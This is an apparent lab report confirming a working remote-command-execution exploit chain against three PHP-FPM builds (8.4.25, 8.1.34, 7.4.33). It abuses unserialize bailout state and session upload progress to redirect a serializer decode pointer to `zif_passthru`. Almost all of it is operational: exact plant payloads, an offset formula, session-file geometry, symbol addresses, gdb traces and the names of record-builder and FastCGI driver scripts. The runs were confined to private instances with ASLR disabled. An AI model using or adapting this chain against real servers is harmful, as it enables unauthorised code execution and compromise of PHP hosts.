# verzif 20261022T004500Z: live `zif_passthru` at `ps_serializers[2].decode` on three V6 non-PIE FPM builds

UTC stamp: 20261022T004500Z (runs 2026-10-22 01:11-01:17 local).

Scope: one private FPM instance per PHP branch, own port / docroot / sessions / logs,
ASLR disabled per instance with `setarch x86_64 -R`. No shared service touched.
Request budget 40/version; used 7 / 8 / 7. All instances shut down at close;
ports 28880-28882 are closed.

## 0. Result

All three builds execute a command through `zif_passthru` reached from
`ps_serializers[2].decode`, and the FPM worker survives with no crash in the
passthru path. `zif_passthru` avoids the `zif_system` fault at `php_exec+450`
(`RETVAL_EMPTY_STRING`): `php_exec` returns and the request completes.

| branch | marker (mtime, inode) | response | worker | passthru crash | offset mismatch |
|---|---|---|---|---|---|
| 8.4.25 | `v8425/PASSTHRU_8425`, `01:13:08.277135544`, 3182465 | 200, `PID=132385` | same PID, alive | none | none |
| 8.1.34 | `v8134/PASSTHRU_8134`, `01:16:02.404076871`, 3182522 | 200, `PID=134211` | same PID, alive | none | none |
| 7.4.33 | `v7433/PASSTHRU_7433`, `01:16:52.399803137`, 3182573 | 200, `PID=134719` | same PID, alive | none | none |

The marker file is empty; existence plus mtime/inode is the evidence.
For 8.1/7.4 the gdb probe also logged `AFTER_PHP_EXEC eax=0` (the call returned).
For 8.4 the probe address was initially mis-set to the `ret_array` branch, so the
`AFTER` line is absent; survival there is proven by the 200 with the same PID,
post-trigger memory attach, and the absence of SIGSEGV.

## 1. Static verification (before any lab)

All three binaries are `ET_EXEC`, not stripped, with debug info. The user-supplied
offsets were confirmed independently with `nm` / `objdump` / `.data` reads:

| item | 8.4.25 | 8.1.34 | 7.4.33 |
|---|---|---|---|
| binary | `build/php-8.4.25/sapi/fpm/php-fpm` | `build/php-8.1.34/sapi/fpm/php-fpm` | `build/php-7.4.33/sapi/fpm/php-fpm` |
| md5 | `95cca39b95cb5f2d5b897fc5cc6e8628` | `6ea2762ef76f44674805736e19570bb1` | `9c7b5c2287fdebe6b3324223034715da` |
| `ps_serializers` | `0xe01140` | `0xe01100` | `0xe01060` |
| `A = ps_serializers[2].decode` | `0xe01180` | `0xe01140` | `0xe010a0` |
| entry 2 name | `php_binary` | `php_binary` | `php_binary` |
| entry 2 real decode | `0x703cf4` | `0x6eb0d3` | `0x6d5c7f` |
| `zif_system` | `0x753d20` | `0x7348f9` | `0x71dd66` |
| `zif_passthru` | `0x753d30` | `0x734909` | `0x71dd76` |
| passthru body | `mov edx,3; call php_exec_ex` | same | same |
| PS(serializer) field | `ps_globals+0x160` = `0xe03a60` | `ps_globals+0x130` = `0xe02fb0` | `ps_globals+0x130` = `0xe02df0` |

`zif_passthru = zif_system + 0x10` in all three; the passthru body passes mode 3
to `php_exec_ex`. `A = ps_serializers + 2*24 + 0x10 = ps_serializers + 0x40`.
The entry-2 decode slots in `.data` hold the listed real decode pointers, matching
the hit-1 values observed live.

Fake-frame ABI (from DWARF and `ZEND_CALL_*` macros):

| item | 8.4.25 | 8.1.34 | 7.4.33 |
|---|---|---|---|
| `sizeof(zend_execute_data)` | 80 | 80 | 72 |
| `ZEND_CALL_NUM_ARGS` | `+0x2c` | `+0x2c` | `+0x2c` |
| `ZEND_CALL_FRAME_SLOT` | 5 zvals | 5 zvals | 5 zvals |
| arg 1 zval | `+0x50` | `+0x50` | `+0x50` |
| zval type byte | `+0x58` | `+0x58` | `+0x58` |

7.4's execute_data is 72 bytes, but the frame-slot formula still rounds to five
16-byte slots, so the fake frame is byte-identical in shape across the three.

## 2. Live method

For each branch:

1. Plant request (`unser.php`, urlencoded, no cookie) bails out inside
   `unserialize()` so `BG(unserialize).level = 1` survives the request.
   * 8.4.25: `a:2:{i:0;s:3:"aaa";i:0;s:3:"bbb";}X` - the trailing byte produces
     an unserialize warning, the error handler raises `E_USER_ERROR`, bailout.
   * 8.1.34 / 7.4.33: trailing data is silently ignored (measured: no bailout,
     `AFTER type=array`), so the truncated form
     `a:2:{i:0;s:3:"aaa";i:0;s:3:"bbb";` is used; the parser fails mid-string
     and the handler bails out.
2. `state.gdb` attaches to the idle worker and reads
   `basic_globals.unserialize`: level, `data` (P), `last_dtor` (B0).
3. A K=0 calibration multipart request measures the first decode buffer X1 and
   the re-encoded buffer X2/T2. (The first guess at X1 was deliberately wrong on
   each branch and crashed in `var_push`; the hit-1 breakpoint still printed X1,
   so the worker was respawned, re-planted and recalibrated. See section 4.)
4. The final record writes `A` through the G2 stale-chain zval slot:
   `K = (A - (B0 + 0x10)) / 16`, value = `zif_passthru`. The trigger is a
   multipart POST carrying `PHP_SESSION_UPLOAD_PROGRESS`, so the session decode
   runs pre-RINIT, before RINIT resets `BG(unserialize)`.

Session file geometry: `T1 = 131014`, record 1 key = 96 bytes (fake
`execute_data` at file offsets `0x2c/0x50/0x58`), record 2 payload `L = 130893`,
payload start `Q = 0x77`. The command's fake `zend_string` sits at payload
`0x100` (`len` at `+0x10`, command at `+0x18`). The record re-encodes to
`T2 = 131313` (299-byte upload-progress record) on all three branches, with
the record-1 key and record-2 payload preserved, so the second decode is the
one that dispatches through the overwritten slot.

Measured runtime geometry and final K:

| item | 8.4.25 | 8.1.34 | 7.4.33 |
|---|---|---|---|
| P (`unserialize.data`) | `0x7ffff7a79000` | `0x7ffff7a78000` | `0x7ffff7a75000` |
| B0 (`last_dtor`) | `0x7ffff7a7c000` | `0x7ffff7a7b000` | `0x7ffff7a78000` |
| X1 (first decode buffer) | `0x7ffff7a73000` | `0x7ffff7a75000` | `0x7ffff7a74000` |
| X2 (re-encoded buffer) | `0x7ffff7ab7000` | `0x7ffff7a98000` | `0x7ffff7a97000` |
| T2 | 131313 | 131313 | 131313 |
| K | `-8796083354345` | `-8796083354093` | `-8796083353335` |
| F (`zend_string*` for cmd) | `0x7ffff7ab718f` | `0x7ffff7a9818f` | `0x7ffff7a9718f` |

The relative heap layout is branch-specific (e.g. `P - X1` is `0x6000`, `0x3000`,
`0x1000`), so X1/P/B0/X2 were measured per branch; no V6 binary offset was reused
for the heap.

## 3. Per-version evidence

### 8.4.25 (master 95537, final worker 132385)

```
DECODE hit=1 data=0x7ffff7a73000 val=0x7ffff7a73018 len=131014 level=1 bgdata=0x7ffff7a79000 ser2decode=0x703cf4 ser2encode=0x703a3c
DECODE hit=2 data=0x7ffff7ab7000 val=0x7ffff7ab7018 len=131313 level=1 bgdata=0x7ffff7a79000 ser2decode=0x753d30 ser2encode=0x703a3c
ZIF_PASSTHRU hit rdi=0x7ffff7ab7018 rsi=0x200f1
PHP_EXEC_EX rdi=0x7ffff7ab7018 rsi=0x200f1 rdx=0x3 numargs=1 arg1val=0x7ffff7ab718f arg1type=6
F=0x7ffff7ab718f F+0x10(len)=72
PHP_EXEC type=3 cmd=0x7ffff7ab71a7 array=(nil) retval=0x200f1
```

Marker: `01:13:08.277135544`, inode 3182465. Response `PID=132385`; post-trigger
`ps_serializers[2].decode = 0x753d30`, `BG(unserialize).level = 0`.
No SIGSEGV in the final run.

### 8.1.34 (master 133416, final worker 134211)

```
DECODE hit=1 data=0x7ffff7a75000 val=0x7ffff7a75018 len=131014 level=1 bgdata=0x7ffff7a78000 ser2decode=0x6eb0d3 ser2encode=0x6eaecb
DECODE hit=2 data=0x7ffff7a98000 val=0x7ffff7a98018 len=131313 level=1 bgdata=0x7ffff7a78000 ser2decode=0x734909 ser2encode=0x6eaecb
ZIF_PASSTHRU hit rdi=0x7ffff7a98018 rsi=0x200f1
PHP_EXEC_EX rdi=0x7ffff7a98018 rsi=0x200f1 rdx=0x3 numargs=1 arg1val=0x7ffff7a9818f arg1type=6
F=0x7ffff7a9818f F+0x10(len)=72
PHP_EXEC type=3 cmd=0x7ffff7a981a7 array=(nil) retval=0x200f1
AFTER_PHP_EXEC eax=0
```

Marker: `01:16:02.404076871`, inode 3182522. Response `PID=134211`; post-trigger
`ps_serializers[2].decode = 0x734909` and `ps_serializers[2].name = "php_binary"`,
`BG(unserialize).level = 0`. No SIGSEGV in the final run.

### 7.4.33 (master 134476, final worker 134719)

```
DECODE hit=1 data=0x7ffff7a74000 val=0x7ffff7a74018 len=131014 level=1 bgdata=0x7ffff7a75000 ser2decode=0x6d5c7f ser2encode=0x6d5a77
DECODE hit=2 data=0x7ffff7a97000 val=0x7ffff7a97018 len=131313 level=1 bgdata=0x7ffff7a75000 ser2decode=0x71dd76 ser2encode=0x6d5a77
ZIF_PASSTHRU hit rdi=0x7ffff7a97018 rsi=0x200f1
PHP_EXEC_EX rdi=0x7ffff7a97018 rsi=0x200f1 rdx=0x3 numargs=1 arg1val=0x7ffff7a9718f arg1type=6
F=0x7ffff7a9718f F+0x10(len)=72
PHP_EXEC type=3 cmd=0x7ffff7a971a7 array=(nil) retval=0x200f1
AFTER_PHP_EXEC eax=0
```

Marker: `01:16:52.399803137`, inode 3182573. Response `PID=134719`; post-trigger
`ps_serializers[2].decode = 0x71dd76` and `ps_serializers[2].name = "php_binary"`,
`BG(unserialize).level = 0`. No SIGSEGV in the final run.

In all three, the process stayed the same before and after the trigger, the
FPM error log gained no new entry for the final request, and the command ran
exactly once (one marker per branch).

## 4. Crash points and offset mismatch

* Passthru path: no crash on any branch. `php_exec_ex` returns normally
  (`AFTER_PHP_EXEC eax=0` on 8.1/7.4; 200 + live post-state on 8.4), which is
  the difference from the earlier `zif_system` lane that dies at
  `php_exec+450`.
* Calibration artifact (not the exploit path): the first X1 guess on each branch
  placed the fake P at the wrong file offset, so the record's zero payload
  overwrote the real P and the inlined `var_push` dereferenced NULL:
  * 8.4.25: `var_unserializer.c:124` -> fault address `0x7ac353`
    (`php_var_unserialize_internal+445`); live rip was not archived (the log
    was overwritten by the successful recalibration).
  * 8.1.34: `SIGSEGV` at `0x782453` (`var_unserializer.c:124`).
  * 7.4.33: `SIGSEGV` at `0x767781` (`var_unserializer.c:121`; same load).
  In each case the worker respawned and the re-plant reproduced the same P/B0.
* Offset mismatch: none. The V6 `A` slots, the `ps_serializers+0x40` layout, the
  `ps_globals` cached-pointer fields, the real entry-2 decode pointers, and
  `zif_passthru = zif_system+0x10` all matched the live binaries exactly.
  Differences per branch are runtime heap addresses and the plant payload shape,
  not binary offsets.

## 5. Files

* `scripts/mkrec.py` - record builder, `--a-target` selects `A`, `K` from P/B0.
* `scripts/drv.py` - FCGI driver; `PLANT_PAYLOAD` env selects the bailout payload.
* `scripts/fcgi.py` - minimal FastCGI client.
* `gdb/calib.gdb` - decode-entry X1/X2 measurement.
* `gdb/final_8425.gdb`, `gdb/final_8134.gdb`, `gdb/final_7433.gdb` - final probes
  (decode hits, `zif_passthru`, `php_exec_ex`, `php_exec`, `AFTER_PHP_EXEC`).
* `gdb/state.gdb`, `gdb/ser.gdb` - post-plant BG state, post-trigger serializer state.
* `v8425/phase/final_gdb.txt`, `v8425/phase/mkrec_final.json`,
  `v8425/phase/marker_8425.txt`, `v8425/phase/post_trigger_state.txt`.
* `v8134/phase/final_gdb.txt`, `v8134/phase/mkrec_final.json`,
  `v8134/phase/marker_8134.txt`, `v8134/phase/post_trigger_state.txt`.
* `v7433/phase/final_gdb.txt`, `v7433/phase/mkrec_final.json`,
  `v7433/phase/marker_7433.txt`, `v7433/phase/post_trigger_state.txt`.
* `v*/req/requests.log`, `v*/req/count.txt` - per-request receipts and budget.
* `summary.json` - machine-readable copy of the result tables.

Note: `phase/marker_*_file` is a `cp --preserve=timestamps` copy of the original
marker, so its inode differs from the original inode recorded in the table and
in `phase/marker_*.txt`.
